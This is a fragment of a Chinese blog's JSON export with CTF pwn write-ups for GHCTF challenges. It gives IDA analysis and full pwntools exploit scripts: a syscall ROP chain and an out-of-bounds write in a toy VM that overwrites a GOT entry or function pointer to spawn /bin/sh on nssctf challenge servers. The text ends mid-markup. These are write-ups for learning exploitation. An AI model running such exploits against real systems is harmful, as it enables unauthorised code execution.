class=\"line\">payload+=p64(sys_call) <span class=\"comment\">#r15   read</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># r15</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>) <span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(data)+p64(<span class=\"number\">0x3b</span>) <span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(dispatcher)<span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(sys_call)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">payload+=p64(xor_rdx)+p64(rax_r13)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"GHCTF-你真的会布置栈吗？\"><a href=\"#GHCTF-你真的会布置栈吗？\" class=\"headerlink\" title=\"GHCTF 你真的会布置栈吗？\"></a>GHCTF 你真的会布置栈吗？</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"start函数分析\"><a href=\"#start函数分析\" class=\"headerlink\" title=\"_start函数分析\"></a>_start函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/08/67cc554898165.png\" alt=\"813b6b639a05fd8870ff80b5be117df7.png\"><br>1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大<br>2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看</p>\n<h3 id=\"print函数分析\"><a href=\"#print函数分析\" class=\"headerlink\" title=\"print函数分析\"></a>print函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/08/67cc56bc5732f.png\" alt=\"a36c17d8abe90bc1a9920db0595e982d.png\"><br>1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.</p>\n<h3 id=\"gadgets-分析\"><a href=\"#gadgets-分析\" class=\"headerlink\" title=\"gadgets 分析\"></a>gadgets 分析</h3><p>1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.<br>2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.<br>3.同时，dispatch留有执行rbx中代码的功能.<br>4.下方还可以控制rdx，rsi，rdi 值为0.</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。<br>2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax&#x3D;0x3b，可以通过r13 和 <code>xchg rax，r13</code> 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，<code>&quot;/bin/sh\\x00&quot;</code> 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。<br>3.read函数，需要控制rax&#x3D;0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。<br>4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell<br>5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。<br>6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"花里胡哨的rop\"><a href=\"#花里胡哨的rop\" class=\"headerlink\" title=\"花里胡哨的rop\"></a>花里胡哨的rop</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28634</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./attachment&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\">sys_call=<span class=\"number\">0x401077</span></span><br><span class=\"line\">rax_r13=<span class=\"number\">0x40100c</span></span><br><span class=\"line\">data=<span class=\"number\">0x402000</span></span><br><span class=\"line\">gadget_pop=<span class=\"number\">0x401017</span></span><br><span class=\"line\">dispatcher=<span class=\"number\">0x401011</span></span><br><span class=\"line\">xor_rsi=<span class=\"number\">0x401027</span></span><br><span class=\"line\">Free_Gate=<span class=\"number\">0x40101c</span></span><br><span class=\"line\">xor_rdx=<span class=\"number\">0x401021</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(gadget_pop)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload+=p64(gadget_pop) <span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(data) <span class=\"comment\">#rsi ,rsp</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> <span class=\"comment\">#rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(rax_r13) <span class=\"comment\">#r15 </span></span><br><span class=\"line\">payload+=p64(Free_Gate)</span><br><span class=\"line\">payload+=p64(sys_call) <span class=\"comment\">#r15   read</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(gadget_pop)<span class=\"comment\"># r15</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0</span>) <span class=\"comment\"># rsp,rsi</span></span><br><span class=\"line\">payload+=p64(data)+p64(data)+p64(<span class=\"number\">0x3b</span>) <span class=\"comment\"># rdi,rbx,r13</span></span><br><span class=\"line\">payload+=p64(dispatcher)<span class=\"comment\">#r15</span></span><br><span class=\"line\">payload+=p64(sys_call)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">payload+=p64(xor_rdx)+p64(rax_r13)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"GHCTF my_vm","_content":"# GHCTF my_vm\n\n## ida分析\n\n### main函数分析\n![3f01387abe8311ab1b7074076d401f21.png](https://img.picui.cn/free/2025/03/07/67cad4a470919.png)\n\n1.存在backdoor()函数，点开发现system(\"/bin/sh\\x00\").可以直接利用这个地址0x400877.\n2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了\n3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。\n\n### execute函数分析\n![ce03e0db0dc58c5804e54f85fa17415e.png](https://img.picui.cn/free/2025/03/07/67cad6af01ff1.png)\n![13ff0390c00c30152ec7d6fa2c06df9c.png](https://img.picui.cn/free/2025/03/07/67cad6aee4df5.png)\n![607b380e75b4290a943509c3c299364c.png](https://img.picui.cn/free/2025/03/07/67cad7ed8076c.png)\n1.首先看，对op的处理，和对op的限制\n2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改\n3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改\n4.从第三张图，查看option==0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界\n\n## 构造思路\n1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行\n2.接着读入op。我们需要对op作一点处理，便于控制每一个字节\n\n```python\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n```\n通过样的处理，我们可以控制每个字节，便于准确的控制\n3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法\n4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以rax*4 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到\n5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor\n6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.\n\n## exp \n\n### 修改puts_got\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nbackdoor=0x400877 # system(\"/bin/sh\\x00\")\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(27))\n\nputs_got=0x602018\noffset=0x6020e0-0x602018\nreg=0x6420E0\nmemory=0x6020E0\n###\n\n\n###\n\n### Code \nCode(0x10,0,0,0x8)  # reg[0]=0x8\nCode(0x10,1,0,0x4)  # reg[1]=0x4\nCode(0x40,2,1,0)    # reg[2]=0xc\nCode(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0\nCode(0x10,4,0,0x6)  # reg[4]=0x6\nCode(0x40,4,4,0)    # reg[4]=0xe\nCode(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      \nCode(0x10,5,0,0x7)  # reg[5]=0x7\nCode(0x40,5,5,0)    # reg[5]=0xf\nCode(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0\nCode(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff \nCode(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00\nCode(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce\n\n#0x400877\nCode(0x10,4,0,0x7)  # reg[4]=0x7\nCode(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70\nCode(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000\nCode(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000\nCode(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800\nCode(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877\nCode(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877\nCode(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877\n#gdb.attach(io)\nio.interactive()\n```\n\n### 覆盖func\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(14))\n\n\n### Code \nCode(0x10,0,0,8)   #reg[0]=8\nCode(0x10,1,0,0)\nCode(0x50,1,1,0)   #reg[1]=-8\nCode(0x10,2,0,7)   #reg[2]=7\nCode(0x10,4,0,4)   #reg[4]=4\nCode(0x80,3,2,4)   #reg[3]=0x70\nCode(0x40,3,3,2)   #reg[3]=0x77\n### backdoor  \nCode(0x80,4,4,4)   #reg[4]=0x40\nCode(0x80,4,4,0)   #reg[4]=0x4000\nCode(0x80,4,4,0)   #reg[4]=0x400000\nCode(0x80,0,0,0)   #reg[0]=0x800\nCode(0x40,0,0,3)   #reg[0]=0x877\nCode(0x40,4,4,0)   #reg[4]=0x400877\nCode(0x90,1,4,0)\nio.interactive()\n\n```","source":"_posts/vm/GHCTF my_vm.md","raw":"---\ntitle: GHCTF my_vm\n---\n# GHCTF my_vm\n\n## ida分析\n\n### main函数分析\n![3f01387abe8311ab1b7074076d401f21.png](https://img.picui.cn/free/2025/03/07/67cad4a470919.png)\n\n1.存在backdoor()函数，点开发现system(\"/bin/sh\\x00\").可以直接利用这个地址0x400877.\n2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了\n3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。\n\n### execute函数分析\n![ce03e0db0dc58c5804e54f85fa17415e.png](https://img.picui.cn/free/2025/03/07/67cad6af01ff1.png)\n![13ff0390c00c30152ec7d6fa2c06df9c.png](https://img.picui.cn/free/2025/03/07/67cad6aee4df5.png)\n![607b380e75b4290a943509c3c299364c.png](https://img.picui.cn/free/2025/03/07/67cad7ed8076c.png)\n1.首先看，对op的处理，和对op的限制\n2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改\n3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改\n4.从第三张图，查看option==0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界\n\n## 构造思路\n1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行\n2.接着读入op。我们需要对op作一点处理，便于控制每一个字节\n\n```python\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n```\n通过样的处理，我们可以控制每个字节，便于准确的控制\n3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法\n4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以rax*4 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到\n5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor\n6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.\n\n## exp \n\n### 修改puts_got\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nbackdoor=0x400877 # system(\"/bin/sh\\x00\")\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(27))\n\nputs_got=0x602018\noffset=0x6020e0-0x602018\nreg=0x6420E0\nmemory=0x6020E0\n###\n\n\n###\n\n### Code \nCode(0x10,0,0,0x8)  # reg[0]=0x8\nCode(0x10,1,0,0x4)  # reg[1]=0x4\nCode(0x40,2,1,0)    # reg[2]=0xc\nCode(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0\nCode(0x10,4,0,0x6)  # reg[4]=0x6\nCode(0x40,4,4,0)    # reg[4]=0xe\nCode(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      \nCode(0x10,5,0,0x7)  # reg[5]=0x7\nCode(0x40,5,5,0)    # reg[5]=0xf\nCode(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0\nCode(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff \nCode(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00\nCode(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff\nCode(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00\nCode(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce\n\n#0x400877\nCode(0x10,4,0,0x7)  # reg[4]=0x7\nCode(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70\nCode(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000\nCode(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000\nCode(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000\nCode(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800\nCode(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877\nCode(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877\nCode(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877\n#gdb.attach(io)\nio.interactive()\n```\n\n### 覆盖func\n```python \nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='node1.anna.nssctf.cn'\nport=28844\nelf=ELF(\"./my_vm\")\nif mode == 0:\n    io=process(\"./my_vm\")\nelse :\n    io=remote(url,port)\n\ndef Code(op,dest,src1,src2):\n    code=(op<<24)+(dest<<16)+(src1<<8)+src2\n    io.sendline(str(code))\n\nio.sendlineafter(\"set your IP:\",\"0\")\nio.sendlineafter(\"set your SP:\",\"1\")\nio.sendlineafter(\"execve:\",str(14))\n\n\n### Code \nCode(0x10,0,0,8)   #reg[0]=8\nCode(0x10,1,0,0)\nCode(0x50,1,1,0)   #reg[1]=-8\nCode(0x10,2,0,7)   #reg[2]=7\nCode(0x10,4,0,4)   #reg[4]=4\nCode(0x80,3,2,4)   #reg[3]=0x70\nCode(0x40,3,3,2)   #reg[3]=0x77\n### backdoor  \nCode(0x80,4,4,4)   #reg[4]=0x40\nCode(0x80,4,4,0)   #reg[4]=0x4000\nCode(0x80,4,4,0)   #reg[4]=0x400000\nCode(0x80,0,0,0)   #reg[0]=0x800\nCode(0x40,0,0,3)   #reg[0]=0x877\nCode(0x40,4,4,0)   #reg[4]=0x400877\nCode(0x90,1,4,0)\nio.interactive()\n\n```","slug":"vm/GHCTF my_vm","published":1,"date":"2025-03-24T14:32:33.548Z","updated":"2025-03-24T14:36:32.548Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9io000bbcmy7mye23ix","content":"<h1 id=\"GHCTF-my-vm\"><a href=\"#GHCTF-my-vm\" class=\"headerlink\" title=\"GHCTF my_vm\"></a>GHCTF my_vm</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/07/67cad4a470919.png\" alt=\"3f01387abe8311ab1b7074076d401f21.png\"></p>\n<p>1.存在backdoor()函数，点开发现system(“&#x2F;bin&#x2F;sh\\x00”).可以直接利用这个地址0x400877.<br>2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了<br>3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。</p>\n<h3 id=\"execute函数分析\"><a href=\"#execute函数分析\" class=\"headerlink\" title=\"execute函数分析\"></a>execute函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/07/67cad6af01ff1.png\" alt=\"ce03e0db0dc58c5804e54f85fa17415e.png\"><br><img src=\"https://img.picui.cn/free/2025/03/07/67cad6aee4df5.png\" alt=\"13ff0390c00c30152ec7d6fa2c06df9c.png\"><br><img src=\"https://img.picui.cn/free/2025/03/07/67cad7ed8076c.png\" alt=\"607b380e75b4290a943509c3c299364c.png\"><br>1.首先看，对op的处理，和对op的限制<br>2.寻找漏洞。option &#x3D;&#x3D; 0x90 时，可以对memory上的数据作修改<br>3.基于此，如果<code>reg[dest]</code>设置为负数，那么可以完成对其他数据的修改<br>4.从第三张图，查看option&#x3D;&#x3D;0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在<code>reg[]</code>中写入负数，完成数组的向上越界</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行<br>2.接着读入op。我们需要对op作一点处理，便于控制每一个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br></pre></td></tr></table></figure>\n<p>通过样的处理，我们可以控制每个字节，便于准确的控制<br>3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法<br>4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以rax*4 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到<br>5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor<br>6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"修改puts-got\"><a href=\"#修改puts-got\" class=\"headerlink\" title=\"修改puts_got\"></a>修改puts_got</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span 